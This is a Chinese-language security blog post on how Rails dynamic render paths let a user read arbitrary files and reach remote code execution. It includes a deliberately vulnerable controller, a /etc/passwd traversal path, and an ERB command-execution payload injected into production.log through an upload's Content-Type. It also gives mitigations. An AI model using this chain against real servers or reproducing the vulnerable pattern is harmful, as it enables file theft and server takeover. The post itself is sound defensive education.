---

title: "Rails 動態樣板路徑的風險"
description: "OWASP 是說，如果你的樣板路徑是動態產生的，而且使用者可以控制那個樣板路徑，那麼使用者就可以讀取到任意樣板，包含管理介面的樣板。這樣的描述感覺還好，但就我們的發現，這其實是更嚴重的直接存取物件問題(Insecure Direct Object References)，甚至有機會造成遠端命令執行(Remote Code Execution)，怎麼說呢？我們直接看下去。"
category: "技術專欄"
tags: ["Rails", "Vulnerability", "RCE", "IDOR"]
author: "shaolin"
keywords: "Rails, Vulnerability, RCE, IDOR"
og_image: "https://lh3.googleusercontent.com/-5Vlr0dDR9YA/VbHwkylOKLI/AAAAAAAAAzU/BiJ2eCEC6Js/w640-h320-no/rails.png"
---


![Rails logo](https://lh3.googleusercontent.com/-5Vlr0dDR9YA/VbHwkylOKLI/AAAAAAAAAzU/BiJ2eCEC6Js/w640-h320-no/rails.png)

### 前言

從安全開發的角度來看，Ruby on Rails 是一套很友善的框架。它從框架層避免了很多過去網站常出現的安全問題，例如使用 ORM 避免大部分的 SQL injection 問題、有內建的 authenticity_token 讓開發者不必特別煩惱 CSRF、從機制面規定開發者使用 Strong Parameter 避免 Mass Assignment、預設轉化危險字元避免 XSS 等...。

就我們過去[滲透測試](http://devco.re/services/penetration-test "滲透測試")的經驗來說，Rails 網站雖然還是能找到問題，但相對問題較少，而且很少單純因為 Rails 寫法問題拿到系統操作權。而今天要分享的，是在一次滲透測試中比較特別的例子，因為開發者使用了動態樣板路徑(Dynamic Render Paths)的寫法[^note1]，最後造成了嚴重的結果。

[^note1]: Dynamic Render Paths 目前並沒有中文翻譯，因為問題之精髓在於要產生的樣板路徑是可變動的，因此筆者認為動態樣板路徑這個翻譯較為貼切。

READMORE

動態樣板路徑，OWASP 的[介紹](https://www.owasp.org/index.php/Ruby_on_Rails_Cheatsheet#Dynamic_Render_Paths)是這樣的：

> In Rails, controller actions and views can dynamically determine which view or partial to render by calling the “render” method. If user input is used in or for the template name, an attacker could cause the application to render an arbitrary view, such as an administrative page.<br /><br />
> Care should be taken when using user input to determine which view to render. If possible, avoid any user input in the name or path to the view.

OWASP 是說，如果你的樣板路徑是動態產生的，而且使用者可以控制那個樣板路徑，那麼使用者就可以讀取到任意樣板，包含管理介面的樣板。這樣的描述感覺還好，但就我們的發現，這其實是更嚴重的直接存取物件問題(Insecure Direct Object References)，甚至有機會造成遠端命令執行(Remote Code Execution)，怎麼說呢？我們直接看下去。
 
### 基本細節

一個動態樣板路徑的寫法如下：


{% highlight ruby %}# app/controllers/welcome_controller.rb
class WelcomeController < ApplicationController
  def index
    page = params[:page] || 'index'
    render page
  end
end
{% endhighlight %}


而 index 的樣板內容是這樣：

{% highlight html %}<!-- app/views/welcome/index.html.erb -->
This is INDEX page.
{% endhighlight %}

另外建一個 demo 樣板做示意：

{% highlight html %}<!-- app/views/welcome/demo.html.erb -->
This is DEMO page.
{% endhighlight %}

實際測試，如果我們連到 WelcomeController 的 index action，不帶任何參數會讀取 index 模版。

[![Rails render index view](https://lh3.googleusercontent.com/-NstaKpheeYU/VbHQn-6gVDI/AAAAAAAAAyg/Cb0rkZuV31o/w951-h376-no/render_index.png "Rails render index view")](https://lh3.googleusercontent.com/-NstaKpheeYU/VbHQn-6gVDI/AAAAAAAAAyg/Cb0rkZuV31o/w951-h376-no/render_index.png)

如果帶參數 page=demo，會讀取到 demo 模版。

[![Rails render demo view](https://lh5.googleusercontent.com/-8m8hUKiPDM4/VbHQpLZWF7I/AAAAAAAAAyo/xyJAW9ehQhE/w951-h376-no/render_demo.png "Rails render demo view")](https://lh5.googleusercontent.com/-8m8hUKiPDM4/VbHQpLZWF7I/AAAAAAAAAyo/xyJAW9ehQhE/w951-h376-no/render_demo.png)

所以，如果我們知道管理介面的模版路徑，送出路徑參數就可以讀取到管理介面。這就是 OWASP 所描述的風險，攻擊者得以讀取任意模版。

[![Rails render admin view](https://lh6.googleusercontent.com/-DNSDV7HwXiQ/VbHQp5PHzVI/AAAAAAAAAyw/ceqXQZJYdCw/w951-h375-no/render_admin.png "Rails render admin view")](https://lh6.googleusercontent.com/-DNSDV7HwXiQ/VbHQp5PHzVI/AAAAAAAAAyw/ceqXQZJYdCw/w951-h375-no/render_admin.png)

然而，當我們嘗試送出系統絕對路徑例如 /etc/passwd [^note2]，網頁竟然吐出了 /etc/passwd 的內容！這就是之前所述的直接存取物件問題，可以遍歷目錄瀏覽檔案。

[^note2]: 筆者測試的環境為 Rails 4.1.4，其他 Rails 版本有可能需要用 ../../../../../etc/passwd 跳脫目前目錄。

[![Rails render Insecure Direct Object References](https://lh5.googleusercontent.com/-FtPEW-Y0dlQ/VbHQrLP8A8I/AAAAAAAAAy4/lL7bRT9P57g/w781-h548-no/render_file_traversal.png "Rails render Insecure Direct Object References")](https://lh5.googleusercontent.com/-FtPEW-Y0dlQ/VbHQrLP8A8I/AAAAAAAAAy4/lL7bRT9P57g/w781-h548-no/render_file_traversal.png)

### 進階攻擊

通常在 Rails 環境下能夠讀取任意檔案，攻擊者會優先尋找 secret_token，目的是變造惡意 session cookie 利用 Marshal serialize 的問題做 [RCE](http://robertheaton.com/2013/07/22/how-to-hack-a-rails-app-using-its-secret-token/)。然而在本案例系統使用了 Rails 4.1 後的版本，Rails 4.1 預設使用了 JSON-based 的 serializer 防止了之前的 RCE 問題，所以並沒有辦法輕鬆利用。

為了取得系統操作權，我們嘗試尋找其他可利用的地方。在這邊我們發現了該站系統 production.log 中存在 AWS 的上傳紀錄。如下：

{% highlight ruby %}# log/production.log
INFO -- : [AWS S3 200 0.041347 0 retries] put_object(:acl=>:public_read,:bucket_name=>"xxxx",:content_length=>12405,:content_type=>"image/png",:data=>#<File:/Users/shaolin/project/playground/rails/render/public/uploads/tmp/test_upload.png (12405 bytes)>,:key=>"upload_001")
{% endhighlight %}

於是我們可以利用上傳檔案的 Content-Type 內容，將 Embedded Ruby 語句 <%=\`#{params[:devcore]}\`%> 添加到 production.log 檔案裡面。於是 log 的內容變成了下面這樣：

{% highlight ruby %}# log/production.log
INFO -- : [AWS S3 200 0.041347 0 retries] put_object(:acl=>:public_read,:bucket_name=>"xxxx",:content_length=>12405,:content_type=>"image/png",:data=>#<File:/Users/shaolin/project/playground/rails/render/public/uploads/tmp/test_upload.png (12405 bytes)>,:key=>"upload_001")

INFO -- : [AWS S3 200 0.040211 0 retries] put_object(:acl=>:public_read,:bucket_name=>"xxxx",:content_length=>12405,:content_type=>"<%=`#{params[:devcore]}`%>",:data=>#<File:/Users/shaolin/project/playground/rails/render/public/uploads/tmp/test_upload.png (12405 bytes)>,:key=>"upload_002")
{% endhighlight %}

接著，我們就可以利用前面的弱點讀取 production.log 檔案，再帶一個 devcore 參數作為指令，如圖，成功取得系統操作權 :p

[![Rails render Remote Code Execution](https://lh5.googleusercontent.com/-XWHiF7oruyg/VbHQsHZLN7I/AAAAAAAAAzA/azHZCbsBFBo/w729-h548-no/render_RCE.png "Rails render Remote Code Execution")](https://lh5.googleusercontent.com/-XWHiF7oruyg/VbHQsHZLN7I/AAAAAAAAAzA/azHZCbsBFBo/w729-h548-no/render_RCE.png)

### 風險原因

一般來說 Rails 開發並不太會這樣寫，但稍微搜尋一下 Github 還是能發現這種寫法存在一些專案中。我想主要原因多半是開發者想要偷懶，然後也可能想說動態樣板路徑頂多就被看到面板的 html，無傷大雅。誰知道就因為這樣導致整個程式碼內容被讀取。

若有一個 action 要動態顯示不同模版的需求，為了避免上述的問題，就辛苦點先用 case...when 去判斷吧。這跟不要用字串組 SQL 語句避免 SQL injection 一樣，這種外面傳進來的參數都要謹慎處理的觀念要內化在開發中。

除了開發者基本上不應該這樣開發外，Rails 本身也有一點點問題，當 render 路徑沒有副檔名，無法判斷什麼格式時，就會直接採用預設的 template handler。

{% highlight ruby %}# lib/action_view/template/resolver.rb
def extract_handler_and_format_and_variant(path, default_formats)
  pieces = File.basename(path).split(".")
  pieces.shift

  extension = pieces.pop
  unless extension
    message = "The file #{path} did not specify a template handler. The default is currently ERB, " \
              "but will change to RAW in the future."
    ActiveSupport::Deprecation.warn message
  end

  handler = Template.handler_for_extension(extension)
  format, variant = pieces.last.split(EXTENSIONS[:variants], 2) if pieces.last
  format  &&= Template::Types[format]

  [handler, format, variant]
end
{% endhighlight %}

而這裡預設的 handler 是 ERB（見 register_default_template_handler），所以有本篇後面提到的進階攻擊，可以被利用來 RCE。

{% highlight ruby %}# lib/action_view/template/handlers.rb
def self.extended(base)
  base.register_default_template_handler :erb, ERB.new
  base.register_template_handler :builder, Builder.new
  base.register_template_handler :raw, Raw.new
  base.register_template_handler :ruby, :source.to_proc
end
{% endhighlight %}

慶幸的是，目前 Rails 已經把預設的 template handler 從 ERB 改成 RAW，不會輕易把要 render 的檔案當成 ERB 執行了。詳細的內容請參考這個 [commit](https://github.com/rails/rails/commit/4be859f0fdf7b3059a28d03c279f03f5938efc80)。

### 結論

Ruby on Rails 能讓開發者較輕鬆的開發出安全的應用程式，然而，若開發者不注意，還是有可能寫出嚴重的漏洞。本文的動態樣板路徑就是這樣一個例子，它不只是 OWASP 所描述的可以存取任意模版而已，它可以遍歷檔案，甚至因為 rails 預設的 template handler 是 ERB，造成遠端命令執行讓攻擊者取得伺服器操作權。

這個例子又再次驗證，框架可以幫助大家快速開發，增加安全度。但唯有良好的安全意識，才是應用程式安全的基石。

### 註解

